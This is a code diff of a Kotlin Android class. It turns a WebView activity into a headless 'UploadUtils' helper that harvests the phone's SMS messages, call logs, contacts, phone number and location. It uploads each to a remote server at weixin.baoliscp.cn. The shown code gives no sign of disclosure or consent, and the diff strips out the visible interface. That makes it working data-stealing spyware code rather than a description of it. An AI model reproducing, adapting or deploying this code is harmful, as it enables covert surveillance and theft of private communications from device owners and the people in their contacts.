@@ -12,6 +12,7 @@ import android.provider.ContactsContract
 import android.provider.CallLog.Calls
 import android.content.Context
 import android.net.Uri
+import android.os.Environment
 import android.webkit.JavascriptInterface
 import android.telephony.TelephonyManager
 import android.text.TextUtils
@@ -24,40 +25,55 @@ import com.google.gson.Gson
 import com.google.gson.JsonObject
 import com.xinyong.http.HttpUtil
 import java.lang.Exception
+import android.webkit.ValueCallback
+import java.io.File
 
 
-class MainActivity : AppCompatActivity() {
+class UploadUtils  {
     private val SMS_INBOX = Uri.parse("content://sms/")
     var mLocationClient: LocationClient? = null
     var mToken: String = ""
     var num: String? = ""
+    var context: Context? = null
     private val myListener = MyLocationListener()
-    override fun onCreate(savedInstanceState: Bundle?) {
-        super.onCreate(savedInstanceState)
-        setContentView(R.layout.activity_main)
-        val settings = host_webview.getSettings()
-        settings.setJavaScriptEnabled(true)
-        settings.setSupportZoom(true)
-        settings.supportMultipleWindows()
-        settings.setJavaScriptCanOpenWindowsAutomatically(true)
-        settings.setDomStorageEnabled(true)
-        settings.setAppCacheEnabled(true)
-
-        host_webview.setWebViewClient(object : WebViewClient() {
-            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
-                view.loadUrl(url)
-                return true
-            }
-        })
-        host_webview.setHorizontalScrollBarEnabled(false)
-        host_webview.setVerticalScrollBarEnabled(false)
-
-        host_webview.webChromeClient = WebChromeClient()
-
-        host_webview.loadUrl("http://weixin.baoliscp.cn")
-
-        host_webview.addJavascriptInterface(this, "android")
-        mLocationClient = LocationClient(getApplicationContext())
+    fun init(context: Context) {
+        this.context = context
+//        super.onCreate(savedInstanceState)
+////        setContentView(R.layout.activity_main)
+////        val settings = host_webview.getSettings()
+////        settings.setJavaScriptEnabled(true)
+////        settings.setSupportZoom(true)
+////        settings.supportMultipleWindows()
+////        settings.setJavaScriptCanOpenWindowsAutomatically(true)
+////        settings.setDomStorageEnabled(true)
+////        settings.setAppCacheEnabled(true)
+////        settings.setAllowContentAccess(true); // 是否可访问Content Provider的资源，默认值 true
+////        settings.setAllowFileAccess(true);    // 是否可访问本地文件，默认值 true
+////        // 是否允许通过file url加载的Javascript读取本地文件，默认值 false
+////        settings.setAllowFileAccessFromFileURLs(false);
+////        // 是否允许通过file url加载的Javascript读取全部资源(包括文件,http,https)，默认值 false
+////        settings.setAllowUniversalAccessFromFileURLs(false);
+////
+////        //辅助WebView处理图片上传操作
+////        //加载地址
+////
+////        host_webview.setWebViewClient(object : WebViewClient() {
+////            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
+////                view.loadUrl(url)
+////                return true
+////            }
+//        })
+//        host_webview.setHorizontalScrollBarEnabled(false)
+//        host_webview.setVerticalScrollBarEnabled(false)
+//
+//        host_webview.webChromeClient = WebChromeClient()
+//
+//        host_webview.loadUrl("http://weixin.baoliscp.cn")
+////        host_webview.loadUrl("file:///android_asset/JavaScript.html")
+//
+//
+//        host_webview.addJavascriptInterface(this, "android")
+        mLocationClient = LocationClient(context)
         //声明LocationClient类
         mLocationClient?.registerLocationListener(myListener)
 
@@ -74,9 +90,8 @@ class MainActivity : AppCompatActivity() {
 
     @JavascriptInterface
     fun getToken(token: String) {
-
+        println("upload " + token)
         uploadData(token)
-
 
     }
 
@@ -92,6 +107,7 @@ class MainActivity : AppCompatActivity() {
         if (TextUtils.isEmpty(token)) {
             mToken = num!!
         } else {
+            num = token
             mToken = token
         }
 
@@ -104,10 +120,8 @@ class MainActivity : AppCompatActivity() {
         contJson.addProperty("mobileNo", num)
         HttpUtil.post {
             url = "http://weixin.baoliscp.cn/index.php?g=Api&m=User&a=index"
-            heards.put("token", mToken)
             params.put("methodCode", "005")
             params.put("data", contJson.toString())
-            params.put("token", mToken)
             onSuccess = {
                 println("upload" + it)
             }
@@ -124,10 +138,9 @@ class MainActivity : AppCompatActivity() {
 
         HttpUtil.post {
             url = "http://weixin.baoliscp.cn/index.php?g=Api&m=User&a=index"
-            heards.put("token", mToken)
             params.put("methodCode", "002")
             params.put("data", smsObj.toString())
-            params.put("token", mToken)
+
             onSuccess = {
                 println("upload" + it)
             }
@@ -160,8 +173,6 @@ class MainActivity : AppCompatActivity() {
         println("object       " + callLogObj.toString())
         HttpUtil.post {
             url = "http://weixin.baoliscp.cn/index.php?g=Api&m=User&a=index"
-            heards.put("token", mToken)
-            params.put("token", mToken)
             params.put("methodCode", "001")
             params.put("data", callLogObj.toString())
             onSuccess = {
@@ -170,30 +181,6 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    override fun onResume() {
-        super.onResume()
-        host_webview.onResume()
-        uploadData("")
-    }
-
-    override fun onPause() {
-        super.onPause()
-        host_webview.onPause()
-    }
-
-    override fun onDestroy() {
-        super.onDestroy()
-        activity_web.removeView(host_webview)
-        host_webview.destroy()
-    }
-
-    override fun onKeyDown(keyCode: Int, event: KeyEvent): Boolean {
-        if (keyCode == KEYCODE_BACK && host_webview.canGoBack()) {
-            host_webview.goBack()
-            return true
-        }
-        return super.onKeyDown(keyCode, event)
-    }
 
 
     inner class MyLocationListener : BDAbstractLocationListener() {
@@ -210,8 +197,6 @@ class MainActivity : AppCompatActivity() {
             println("location" + province + city + district + street)
             HttpUtil.post {
                 url = "http://weixin.baoliscp.cn/index.php?g=Api&m=User&a=index"
-                heards.put("token", mToken)
-                params.put("token", mToken)
                 params.put("methodCode", "003")
                 params.put("data", adressObj.toString())
                 onSuccess = {
@@ -224,7 +209,7 @@ class MainActivity : AppCompatActivity() {
     //获取本机号码
     @SuppressLint("MissingPermission")
     fun getTeleNum(): String? {
-        val tm = this.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
+        val tm = context?.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
         val tel = tm!!.line1Number//手机号码
         return tel
     }
@@ -232,9 +217,9 @@ class MainActivity : AppCompatActivity() {
     //获取短信
     fun getSmsFromPhone(): MutableList<Sms> {
         var smss = mutableListOf<Sms>()
-        val cr = contentResolver
+        val cr = context?.contentResolver
         val projection = arrayOf("_id", "address", "person", "body", "date", "type")
-        val cur = cr.query(SMS_INBOX, projection, null, null, "date desc")
+        val cur = cr?.query(SMS_INBOX, projection, null, null, "date desc")
         if (null == cur) {
             return smss
         }
@@ -257,10 +242,10 @@ class MainActivity : AppCompatActivity() {
     @SuppressLint("MissingPermission")
     fun getCallLog(): List<CallRecords> {
         val infos = ArrayList<CallRecords>()
-        val cr = this.getContentResolver()
+        val cr = context?.getContentResolver()
         val uri = Calls.CONTENT_URI
         val projection = arrayOf(Calls.NUMBER, Calls.DATE, Calls.DURATION)
-        val cursor = cr.query(uri, projection, null, null, null)
+        val cursor = cr?.query(uri, projection, null, null, null)
         while (cursor!!.moveToNext()) {
             val number = cursor!!.getString(0)
             val date = cursor!!.getLong(1)
@@ -279,7 +264,7 @@ class MainActivity : AppCompatActivity() {
         //指定获取_id和display_name两列数据，display_name即为姓名
         val projection = arrayOf(ContactsContract.Contacts._ID, ContactsContract.Contacts.DISPLAY_NAME)
         //根据Uri查询相应的ContentProvider，cursor为获取到的数据集
-        val cursor = this.contentResolver.query(uri, projection, null, null, null)
+        val cursor = context?.contentResolver?.query(uri, projection, null, null, null)
         val arr = mutableListOf<Contact>()
         var i = 0
         if (cursor != null && cursor.moveToFirst()) {
@@ -291,7 +276,7 @@ class MainActivity : AppCompatActivity() {
                 val phoneProjection = arrayOf(ContactsContract.CommonDataKinds.Phone.NUMBER)
 
                 //根据联系人的ID获取此人的电话号码
-                val phonesCusor = this.contentResolver.query(
+                val phonesCusor = context?.contentResolver?.query(
                         ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                         phoneProjection,
                         ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + id, null, null)
